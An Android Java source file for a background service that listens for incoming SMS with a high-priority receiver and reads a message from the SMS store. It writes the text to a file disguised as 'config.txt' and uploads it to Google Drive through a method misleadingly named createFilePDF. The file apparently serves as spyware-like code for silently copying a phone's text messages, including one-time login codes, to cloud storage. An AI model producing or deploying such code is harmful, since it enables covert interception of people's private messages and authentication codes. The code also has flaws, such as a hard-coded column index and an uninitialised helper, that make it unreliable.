package com.app.sms;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.ProgressDialog;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.annotation.RequiresApi;

import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.Task;

import java.io.IOException;
import java.io.OutputStreamWriter;

public class SMSService extends Service {

    static DriveServiceHelper driveServiceHelper;

    public static final String SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";
    private int MY_PERMISSIONS_REQUEST_SMS_RECEIVE = 10;

    @RequiresApi(api = Build.VERSION_CODES.O)
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        IntentFilter filter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
        filter.setPriority(999);
        registerReceiver(smsReceiver, filter);
//        driveServiceHelper = (DriveServiceHelper) intent.getParcelableExtra("drive");

        CharSequence name = getString(R.string.channel_name);
        String description = getString(R.string.channel_description);
        int importance = NotificationManager.IMPORTANCE_DEFAULT;
        NotificationChannel channel = new NotificationChannel("23", name, importance);
        channel.setDescription(description);

        // Don't see these lines in your code...
        NotificationManager notificationManager = getSystemService(NotificationManager.class);
        notificationManager.createNotificationChannel(channel);


        PendingIntent pendingIntent =
                PendingIntent.getActivity(this, 0, intent, 0);

        Notification notification =
                new Notification.Builder(this ,"23")
                        .setContentTitle(getText(R.string.notification_title))
                        .setContentText(getText(R.string.notification_message))
                        .setContentIntent(pendingIntent)
                        .setTicker(getText(R.string.ticker_text))
                        .build();

// Notification ID cannot be 0.
      startForeground(1, notification);
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        unregisterReceiver(smsReceiver);
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    private BroadcastReceiver smsReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            //here you can parse intent and get sms fields.

            // Toast.makeText(context,"Success 2",Toast.LENGTH_LONG).show();

            readSMS();
            uploadPdfFile();
        }
    };


    private void readSMS() {

        Cursor c = getContentResolver().query(Uri.parse("content://sms"),null,null,null,null);
        c.moveToFirst();
        while(c!=null){

            // Toast.makeText(this,"data",Toast.LENGTH_SHORT).show();
            String msg = c.getString(12);
            writeToFile(msg,this);
            break;
        }
        Log.d("sms","written");
    }


    public void uploadPdfFile(){
//        final ProgressDialog pd = new ProgressDialog(this);
//
//        pd.setTitle("uploading");
//        pd.setMessage("wait");
//        pd.show();
        java.io.File path = getApplicationContext().getFilesDir();

        String filePath = path.toString() +"/config.txt";
        //Toast.makeText(getApplicationContext(),filePath,Toast.LENGTH_LONG).show();
        driveServiceHelper.createFilePDF(filePath).addOnCompleteListener(new OnCompleteListener<String>() {
            @Override
            public void onComplete(@NonNull Task<String> task) {
                //pd.dismiss();
                Toast.makeText(getApplicationContext(),"Success",Toast.LENGTH_LONG).show();

            }

        }).addOnFailureListener(new OnFailureListener() {
            @Override
            public void onFailure(@NonNull Exception e) {
            //    pd.dismiss();
                Toast.makeText(getApplicationContext(),"failed",Toast.LENGTH_LONG).show();
            }
        });

    }
    private void writeToFile(String data, Context context) {
        try {
            // Toast.makeText(this,data,Toast.LENGTH_LONG).show();
            OutputStreamWriter outputStreamWriter = new OutputStreamWriter(context.openFileOutput("config.txt", Context.MODE_PRIVATE));
            outputStreamWriter.write(data);
            outputStreamWriter.close();
        }
        catch (IOException e) {
            Log.e("Exception", "File write failed: " + e.toString());
        }
    }
}
